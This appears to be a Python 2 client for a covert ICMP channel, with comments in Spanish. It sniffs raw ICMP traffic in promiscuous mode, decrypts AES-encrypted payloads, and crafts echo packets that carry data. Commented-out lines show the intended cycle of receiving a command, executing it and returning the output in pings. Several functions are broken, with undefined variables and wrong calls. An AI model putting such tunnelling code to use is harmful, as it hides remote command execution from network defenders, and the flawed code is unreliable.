import os, sys, socket, struct, select, time , threading ,re
from Crypto.Cipher import AES

class ClientICMP:
	ICMP_ECHO_REQUEST = 8
	key_size = 32 #AES256


	def __init__(self):
		HOST = raw_input("Ingresa la ip para hacer el bind: ")
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)#Creacion socket
		s.bind((HOST, 0))
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)  #Se enciende modo promiscuo en la tarjeta de red
		print "Cliente a la escucha......"
		#for i in range(1,2000):   #Se reciben hasta 2000 peticiones
		#while 1:
		data = s.recvfrom(65565)
		data=str(data)
		#print data
		#d1 = str(data[0])
		data1= re.search("@@(.*)",data).group().replace("@@","")
		data1=data1[0:-24]
		print data1
		print len(data1)
		
		#print data1
		print self.descifrar(data1)
		#opcion=raw_input("Desea salir")
		#if opcion=='y':
			#	break
			#else:
			#	continue
				
			
			#command = data1.group(0)
			#print command
			#cmd = command[2:]
			#print cmd
			#if i%2 == 0:
				#d = data[1]
				#d1 = str(d)
				#ip = d1[2:-5]
				#print ip
			#print cmd   # Holding the command to execute
			#print ip        #Holding the destination address to send the ping
			#output = execute(cmd)
			#for line in output.readlines():
			#do_one(ip,delay,line)
			#pass
		s.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
			
	def checksum(self,source):
		sum = 0
		countTo = (len(source_string)/2)*2
		count = 0
		while count<countTo:
			thisVal = ord(source_string[count + 1])*256 + ord(source_string[count])
			sum = sum + thisVal
			sum = sum & 0xffffffff
			count = count + 2
	 
		if countTo<len(self,source_string):
			sum = sum + ord(source_string[len(source_string) - 1])
			sum = sum & 0xffffffff
	 
		sum = (sum >> 16)  +  (sum & 0xffff)
		sum = sum + (sum >> 16)
		answer = ~sum
		answer = answer & 0xffff
			# Swap bytes.
		answer = answer >> 8 | (answer << 8 & 0xff00)
		return answer
		
	def crafting_packet(self,my_socket,dest_addr,ID,data_send):
		data = "$$"+data_send
		dest_addr  =  socket.gethostbyname(dest_addr)
		# Header is type (8), code (8), checksum (16), id (16), sequence (16)
		my_checksum = 0
		# Make a dummy heder with a 0 checksum.
		header = struct.pack("bbHHh", self.ICMP_ECHO_REQUEST, 0, my_checksum, ID, 1)
		#bytesInDouble = struct.calcsize("d")
		#data = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
		# Calculate the checksum on the data and the dummy header.
		my_checksum = self.checksum(header + data)
		header = struct.pack("bbHHh", self.ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), ID, 1)
		packet = header + data
		my_socket.sendto(packet, (dest_addr, 1))
	
	
	#def receive_ping(my_socket, packet_id, time_sent, timeout):
		# # Receive the ping from the socket.
		# time_left = timeout
		# while True:
			# started_select = time.time()
			# ready = select.select([my_socket], [], [], time_left)
			# how_long_in_select = time.time() - started_select
			# if ready[0] == []: # Timeout
				# return
			# time_received = time.time()
			# rec_packet, addr = my_socket.recvfrom(65565)
			# icmp_header = rec_packet[20:28]
			# type, code, checksum, p_id, sequence = struct.unpack(
				# 'bbHHh', icmp_header)
			# if p_id == packet_id:
				# return time_received - time_sent
			# time_left -= time_received - time_sent
			# if time_left <= 0:
				# return
	# def receiveOnePing(mySocket, ID, timeout, destAddr):
        # #print "receiveOnePing"
        # timeLeft = timeout
 
        # while 1:
			# startedSelect = time.time()
			# whatReady = select.select([mySocket], [], [], timeLeft)
			# howLongInSelect = (time.time() - startedSelect)
			# if whatReady[0] == []: # Timeout
					# return "Request timed out."

			# timeReceived = time.time()

			# recPacket, addr = mySocket.recvfrom(1024)
			# #print "len = %d" % len(recPacket)
			# #Fill in start

			# # Fetch the ICMP header from the IP packet
			# header = recPacket[20:28]
			# type, code, checksum, id, seq= struct.unpack("bbHHh", header)
		   
			# if id ==ID:
					# sizeofdouble = struct.calcsize("d")
					# timeSent = struct.unpack("d", recPacket[28 : 28+sizeofdouble])[0]
					# print "TYPE:%d CODE:%d CHECKSUM:0x%08x ID:%d SEQ:%d TIME:%d ms" % (type, code, checksum, id, seq, (timeReceived-timeSent)*1000)
			# # Fill in end

			# timeLeft = timeLeft - howLongInSelect
			# if timeLeft <= 0:
					# return "Request timed out."
			# else :
					# return "REPLY from %s successfully." % destAddr
				
	def cifrar(self,texto):
		try:
			f=open('C:\Users\darkroo\Desktop\key.txt','rb')
			key=f.readline()
		except IOError as e:
			print "I/O error({0}): {1}".format(e.errno, e.strerror)
			
		secret=texto

		length = 16 - (len(secret) % 16)
		secret += chr(length) * length 

		#salt = Random.new().read(key_size) #salt the hash
		#iv = Random.new().read(AES.block_size)
		iv='e8b919894198be5f8e4b1be784d0e471'.decode('hex')
		#derived_key = PBKDF2(key, salt, key_size, iterations)
		cipher = AES.new(key, AES.MODE_CBC, iv)
		encodedtext = iv + cipher.encrypt(secret)
		encodedtext=encodedtext.encode('base64','strict')
		return encodedtext
	
	
	def descifrar(self,textocifrado):
		key_size = 32 #AES256
		key=''
		try:
			f=open('C:\Users\darkroo\Desktop\key.txt','rb')
			key=f.read()
		except IOError as e:
			print "I/O error({0}): {1}".format(e.errno, e.strerror)
			
		
		iv='e8b919894198be5f8e4b1be784d0e471'.decode('hex')
		cipher = AES.new(key, AES.MODE_CBC, iv)
		encodedtext=textocifrado.decode('base64','strict')
		decodedtext = str(cipher.decrypt(encodedtext))
		decodedtext=decodedtext[16:-ord(decodedtext[-1])] #remove iv and padding
		return decodedtext
	
	def do_one(self,dest_addr, timeout,payload):
		icmp = socket.getprotobyname("icmp")
		try:
			my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)   #Define que sera icmp y debe ser del tipo raw
		except socket.error, (errno, msg):
			if errno == 1:
				# Operation not permitted
				msg = msg + (
				   
				)
				raise socket.error(msg)
			raise # raise the original error
	 
		my_ID = os.getpid() & 0xFFFF
	 
		self.crafting_packet(my_socket, dest_addr, my_ID,payload)
		my_socket.close()
		return delay	
		 
		
cliente=ClientICMP()